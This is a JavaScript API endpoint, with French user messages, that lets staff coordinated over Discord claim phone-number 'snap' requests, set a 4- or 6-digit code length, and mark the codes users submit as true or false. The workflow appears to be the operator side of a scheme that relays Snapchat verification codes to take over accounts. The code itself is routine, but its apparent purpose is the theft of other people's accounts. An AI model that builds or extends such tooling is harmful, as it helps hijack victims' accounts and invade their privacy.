/**
 * api/staff-action.js — Staff action endpoint  (v2.2, MySQL)
 *
 * v2.2: claim persists discord_user_id in claimed_by_discord_id so the bot can
 *       enforce claimer-only buttons even after a restart. unclaim clears it.
 * v2.1: every transition is a guarded UPDATE (WHERE status = expected) and we
 *       check how many rows it matched — atomic, prevents double-claim races.
 *       (MySQL has no RETURNING, so `affectedRows` replaces `result.length`;
 *       every one of these UPDATEs changes `status`, so changed rows == matched.)
 */

import { sql }           from "./_db.js";
import { checkBannedIP } from "./middleware.js";

const STALE_MESSAGE = "Cette demande n'est plus dans l'état attendu (déjà traitée ou réinitialisée).";

function stale(res) {
    return res.status(409).json({ success: false, message: STALE_MESSAGE });
}

/** Best-effort audit log — never fails the request. */
async function log(action, details) {
    try {
        await sql`INSERT INTO snap_logs (action, details) VALUES (${action}, ${JSON.stringify(details)})`;
    } catch {}
}

export default async function handler(req, res) {
    res.setHeader("Access-Control-Allow-Origin", "*");
    if (req.method === "OPTIONS") { res.status(200).end(); return; }
    if (req.method !== "POST")   return res.status(405).json({ success: false });

    try {
        const blocked = await checkBannedIP(req, res);
        if (blocked) return blocked;

        const { action, phone, length, secret, staff_tag, discord_user_id } = req.body;

        if (secret !== process.env.STAFF_SECRET) {
            return res.status(401).json({ success: false, message: "Unauthorized" });
        }

        // ─── CLAIM ────────────────────────────────────────────────────────────
        if (action === "claim") {
            // Atomic: only succeeds if still pending → prevents race condition
            const result = await sql`
                UPDATE snap_requests
                SET    status = 'processing',
                       claimed_by_discord_id = ${discord_user_id ?? null}
                WHERE  phone  = ${phone}
                AND    status = 'pending'
            `;
            if (result.affectedRows === 0) {
                return res.status(409).json({
                    success: false,
                    message: "Cette demande est déjà claim ou introuvable.",
                });
            }
            await log("claim", { phone, staff_tag, discord_user_id });
            return res.status(200).json({ success: true, message: "Demande claim" });
        }

        // ─── SET LENGTH ───────────────────────────────────────────────────────
        if (action === "set_length") {
            const len = Number(length);
            if (![4, 6].includes(len)) {
                return res.status(400).json({
                    success: false,
                    message: "Longueur invalide — doit être 4 ou 6",
                });
            }
            // Guard: only valid from 'processing' (just claimed) or 'retry_code'
            // (after a false_code). Prevents a stale/duplicate Discord message
            // from setting a length on a request that moved on or was reset.
            const result = await sql`
                UPDATE snap_requests
                SET status = 'waiting_code', code_length = ${len}
                WHERE phone = ${phone} AND status IN ('processing', 'retry_code')
            `;
            if (result.affectedRows === 0) return stale(res);
            return res.status(200).json({ success: true, message: `Longueur définie : ${len} chiffres` });
        }

        // ─── WRONG NUMBER ─────────────────────────────────────────────────────
        if (action === "wrong_number") {
            const result = await sql`
                UPDATE snap_requests
                SET status = 'wrong_number', claimed_by_discord_id = NULL
                WHERE phone = ${phone} AND status IN ('processing', 'retry_code')
            `;
            if (result.affectedRows === 0) return stale(res);
            await log("wrong_number", { phone, staff_tag });
            return res.status(200).json({ success: true, message: "Mauvais numéro signalé" });
        }

        // ─── TRUE CODE ────────────────────────────────────────────────────────
        if (action === "true_code") {
            const result = await sql`
                UPDATE snap_requests
                SET status = 'completed', claimed_by_discord_id = NULL
                WHERE phone = ${phone} AND status = 'code_submitted'
            `;
            if (result.affectedRows === 0) return stale(res);
            await log("true_code", { phone, staff_tag });
            return res.status(200).json({ success: true, message: "Code validé" });
        }

        // ─── FALSE CODE ───────────────────────────────────────────────────────
        if (action === "false_code") {
            // Keep claimed_by_discord_id — same staff member handles the retry
            const result = await sql`
                UPDATE snap_requests
                SET status = 'retry_code'
                WHERE phone = ${phone} AND status = 'code_submitted'
            `;
            if (result.affectedRows === 0) return stale(res);
            await log("false_code", { phone, staff_tag });
            return res.status(200).json({ success: true, message: "Code refusé, l'utilisateur doit ressaisir" });
        }

        // ─── UNCLAIM ──────────────────────────────────────────────────────────
        if (action === "unclaim") {
            const result = await sql`
                UPDATE snap_requests
                SET status = 'pending', claimed_by_discord_id = NULL
                WHERE phone = ${phone} AND status IN ('processing', 'retry_code')
            `;
            if (result.affectedRows === 0) return stale(res);
            await log("unclaim", { phone, staff_tag });
            return res.status(200).json({ success: true, message: "Demande unclaimée et remise dans la file" });
        }

        return res.status(400).json({ success: false, message: "Action inconnue" });
    } catch (e) {
        console.error("staff-action error:", e);
        return res.status(500).json({ success: false, message: e.message });
    }
}
